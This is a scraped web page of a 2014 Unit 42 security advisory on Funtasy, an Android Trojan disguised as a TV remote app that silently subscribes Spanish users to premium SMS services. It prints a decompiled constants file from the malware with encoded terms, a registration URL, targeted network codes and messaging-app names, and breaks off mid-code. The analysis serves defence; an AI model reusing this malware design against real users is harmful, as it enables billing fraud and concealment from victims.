<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-5544 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Funtasy Trojan Targets Spanish Android Users with Sneaky SMS Charges</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-5544 entry-meta">
			
			
			<span class="post-views-count">7,724</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'5544','like')"><i class="ui ui-2"></i><span class="ml-5">1</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 8</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffuntasy-trojan-targets-spanish-android-users-sneaky-sms-charges%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffuntasy-trojan-targets-spanish-android-users-sneaky-sms-charges%2F+-+Funtasy+Trojan+Targets+Spanish+Android+Users+with+Sneaky+SMS+Charges" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Ffuntasy-trojan-targets-spanish-android-users-sneaky-sms-charges%2F&title=Funtasy+Trojan+Targets+Spanish+Android+Users+with+Sneaky+SMS+Charges&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/funtasy-trojan-targets-spanish-android-users-sneaky-sms-charges/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/zhi-xu/" title="Posts by Zhi Xu" class="author url fn" rel="author">Zhi Xu</a>, <a href="https://unit42.paloaltonetworks.com/author/claud-xiao/" title="Posts by Claud Xiao" class="author url fn" rel="author">Claud Xiao</a> and <a href="https://unit42.paloaltonetworks.com/author/ryan-olson/" title="Posts by Ryan Olson" class="author url fn" rel="author">Ryan Olson</a>        </p>
        <p><time datetime="2014-05-12T18:32:52+00:00">May 12, 2014 at 11:32 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/threat-advisories-advisories/" rel="category tag">Threat Advisories - Advisories</a>, <a href="https://unit42.paloaltonetworks.com/category/threat-prevention-2/" rel="category tag">Threat Prevention</a>, <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/android/" rel="tag">Android</a>, <a href="https://unit42.paloaltonetworks.com/tag/funtasy/" rel="tag">Funtasy</a>, <a href="https://unit42.paloaltonetworks.com/tag/trojan/" rel="tag">Trojan</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                    <h3>Summary</h3>
<ul>
<li>A new Android Trojan, named Funtasy, began targeting Spanish Android users in mid-April.</li>
<li>Users have downloaded 18 different variants of Funtasy between 13,500 and 67,000 times from the Google Play store.</li>
<li>Funtasy currently targets users of multiple Spanish mobile networks, and one Australian mobile network.</li>
<li>Funtasy subscribes victim’s phones to premium SMS services which cost up to 30 euros per month, while hiding the evidence of the subscription.</li>
</ul>
<h3>Let the Funtasy Begin</h3>
<p><span id="more-5544"></span></p>
<p>Palo Alto Networks WildFire detected a new Android Trojan on May 7th, 2014 when a customer using our enterprise security platform downloaded the malicious application from the Google Play store. We’ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service. The first version of Funtasy we detected is a fake television remote control application.</p>
<p><img class="aligncenter size-large wp-image-5545" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-1-500x155.png" alt="pic 1" width="500" height="155" /></p>
<p style="text-align: center;">Figure 1: Funtasy Trojan Disguised as TV Remote Control App.</p>
<p>A developer using the ID “fun app” published the Trojan, and the remote control application they uploaded on April 21 is their most successful app so far, with between 10,000 and 50,000 downloads on the play store. Based on the reviews, the application does not function very well as a remote, but in reality it doesn’t contain remote control capability. There’s no mention of a premium SMS service in the description, but a review of the permissions reveals that the program will have complete access to SMS messages.</p>
<p><img class="aligncenter size-large wp-image-5546" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-2-500x309.png" alt="pic 2" width="500" height="309" /></p>
<p style="text-align: center;">Figure 2: Remote control app requests complete control over your SMS messages.</p>
<p>After the user installs the remote application and opens it, they are presented with a terms of service screen. This is the user’s only chance to realize that opening this application is going to cost them dearly.</p>
<p><img class="aligncenter size-large wp-image-5547" src="http://researchcenter.paloaltonetworks.com/wp-content/uploads/2014/05/pic-3-500x833.png" alt="pic 3" width="500" height="833" /></p>
<p style="text-align: center;">Figure 3: Remote control app terms of service.</p>
<p>If you can’t read the fine print, I don’t blame you. Here’s the text decoded from the application’s source code.</p>
<p><em>Servicio de suscripción para usuarios Movistar, Vodafone, Orange, Yoigo, R y Simyo para mayores de edad o menores con capacidad legal para contratar, prestados por (FUNTASY MOBILE S.L., operador titular ARGATEL SOLUTIONS SL, n. atención al cliente 902 303 803 ó inf@argatel.com, apartado de correos 167, 17001 Girona. Coste por SMS recibido 1.46 euros/sms (IVA incluido) más el coste de navegación WAP, que dependerá del operador que tenga contratado. Máximo 10 sms/semana. El límite máximo de facturación del servicio puede variar en función de tu operador (18 a 30 euros/mes). Baja automática para cancelar el servicio: envía BAJA al 797977.</em></p>
<p>This message is pretty straightforward, assuming the user actually reads it. It explains that by opening the application the reader agrees to receive up to 10 SMS messages a week at a cost of 1.46 euros each. The maximum cost per month should between 18 and 30 euros per month. If the user would like to unsubscribe they can text “BAJA” to 797977. Any user who reads this message and understands it is unlikely to agree, but Funtasy does not even wait for their agreement.</p>
<p>While the terms page is on the screen, in the background the Trojan checks to see if the phone is attached to a network with one of the following mobile network codes (MNC):</p>
<ul>
<li>21401: Vodafone Spain</li>
<li>21403: France Telecom España SA</li>
<li>21404: Xfera Moviles SA</li>
<li>21406: Vodafone Spain</li>
<li>21407: Telefónica Móviles España</li>
<li>21416: Telecable de Asturias S.A.U.</li>
<li>21417: R Cable y Telecomunicaciones Galicia S.A.</li>
<li>21418: Cableuropa S.A.U.</li>
<li>21419: E-PLUS Moviles Virtuales España S.L.U.</li>
<li>21421: Jazz Telecom S.A.U.</li>
<li>50503: Vodafone Hutchison Australia Proprietary Limited</li>
</ul>
<p>Each of these networks is Spanish, except for a single Australian network. This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file.</p>
<p><em>Constants.java</em></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694b98e2cee305452003" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
package com.lasmejoresapps.tvremotecontrol;

public class Constants {
    public static final String AUSTRALIA_COUNTRY_CODE = "505";
    public static final String GOSMSPRO = "com.jb.gosms";
    public static final String HANDCENTSMS = "com.handcent.nextsms";
    public static final String HANGOUTS = "com.google.android.talk";
    public static final String JAZZTEL_OPERATOR = "JAZZTEL";
    public static final String JAZZTEL_OPERATOR_CODE = "21421";
    public static final String MIO_OPERATOR_CODE = "50503";
    public static final String MOVISTAR_OPERATOR = "MOVISTAR";
    public static final String MOVISTAR_OPERATOR_CODE = "21407";
    public static final String MOVISTAR_OPERATOR_CODE_PHP = "364";
    public static final String ONO_OPERATOR_CODE = "21418";
    public static final String ORANGE_OPERATOR = "ORANGE";
    public static final String ORANGE_OPERATOR_CODE = "21403";
    public static final String ORANGE_OPERATOR_CODE_PHP = "363";
    public static final String ORIGIN_SMS = "Nzk3OTc3";
    public static final String PEPEPHONE_OPERATOR_CODE = "21406";
    public static final String R_OPERATOR_CODE = "21417";
    public static final String R_OPERATOR_CODE_PHP = "368";
    public static final String SECRET_FILE = "configuration_2";
    public static final String SIMYO_OPERATOR = "SIMYO";
    public static final String SIMYO_OPERATOR_CODE = "21419";
    public static final String SIMYO_OPERATOR_CODE_PHP = "367";
    public static final String SPAIN_COUNTRY_CODE = "214";
    public static final String TELECABLE_OPERATOR_CODE = "21416";
    public static final String TELECABLE_OPERATOR_CODE_PHP = "369";
    public static final String TELEGRAM1 = "org.telegram.messenger.account";
    public static final String TELEGRAM2 = "org.telegram.account";
    public static final String TERMS = "U2VydmljaW8gZGUgc3VzY3JpcGNpw7NuIHBhcmEgdXN1YXJpb3MgTW92aXN0YXIsIFZvZGFmb25lLCBPcmFuZ2UsIFlvaWdvLCBSIHkgU2lteW8gcGFyYSBtYXlvcmVzIGRlIGVkYWQgbyBtZW5vcmVzIGNvbiBjYXBhY2lkYWQgbGVnYWwgcGFyYSBjb250cmF0YXIsIHByZXN0YWRvcyBwb3IgKEZVTlRBU1kgTU9CSUxFIFMuTC4sIG9wZXJhZG9yIHRpdHVsYXIgQVJHQVRFTCBTT0xVVElPTlMgU0wsIG4uIGF0ZW5jacOzbiBhbCBjbGllbnRlIDkwMiAzMDMgODAzIMOzIGluZkBhcmdhdGVsLmNvbSwgYXBhcnRhZG8gZGUgY29ycmVvcyAxNjcsIDE3MDAxIEdpcm9uYS4gQ29zdGUgcG9yIFNNUyByZWNpYmlkbyAxLjQ2IGV1cm9zL3NtcyAoSVZBIGluY2x1aWRvKSBtw6FzIGVsIGNvc3RlIGRlIG5hdmVnYWNpw7NuIFdBUCwgcXVlIGRlcGVuZGVyw6EgZGVsIG9wZXJhZG9yIHF1ZSB0ZW5nYSBjb250cmF0YWRvLiBNw6F4aW1vIDEwIHNtcy9zZW1hbmEuIEVsIGzDrW1pdGUgbcOheGltbyBkZSBmYWN0dXJhY2nDs24gZGVsIHNlcnZpY2lvIHB1ZWRlIHZhcmlhciBlbiBmdW5jacOzbiBkZSB0dSBvcGVyYWRvciAoMTggYSAzMCBldXJvcy9tZXMpLiBCYWphIGF1dG9tw6F0aWNhIHBhcmEgY2FuY2VsYXIgZWwgc2VydmljaW86IGVudsOtYSBCQUpBIGFsIDc5Nzk3Ny4=";
    public static final String TEXTSECURE = "org.thoughtcrime.securesms";
    public static final String URL = "aHR0cDovL2Z1bnRhc3ltb2JpbGUuY29tL2FsZXJ0YXNfYWx0YV93ZWIucGhw";
    public static final String VODAFONE_OPERATOR = "VODAFONE ES";
    public static final String VODAFONE_OPERATOR_CODE = "21401";
    public static final String VODAFONE_OPERATOR_CODE_PHP = "365";
    public static final String WHATSAPP = "com.whatsapp";
    public static final String YOIGO_OPERATOR = "YOIGO";
    public static final String YOIGO_OPERATOR_CODE = "21404";
    public static final String YOIGO_OPERATOR_CODE_PHP = "55";

    public Constants() {
        super();
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-2">2</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-4">4</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-6">6</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-8">8</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-10">10</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-12">12</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-14">14</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-16">16</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-18">18</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-20">20</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-22">22</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-24">24</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-26">26</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-28">28</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-30">30</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-32">32</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-34">34</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-36">36</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-38">38</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-40">40</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-42">42</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694b98e2cee305452003-44">44</div><div class="crayon-num" data-line="crayon-5f694b98e2cee305452003-45">45</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694b98e2cee305452003-1"><span class="crayon-t">package</span><span class="crayon-h"> </span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">lasmejoresapps</span><span class="crayon-sy">.</span><span class="crayon-v">tvremotecontrol</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-2">&nbsp;</div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-3"><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">Constants</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">AUSTRALIA_COUNTRY_CODE</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"505"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-5f694b98e2cee305452003-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">GOSMSPRO</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"com.jb.gosms"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694b98e2cee305452003-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-m">final</span><span class="crayon-h"> </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-v">HANDCENTSMS</span><span class="crayon-h"> </span><span 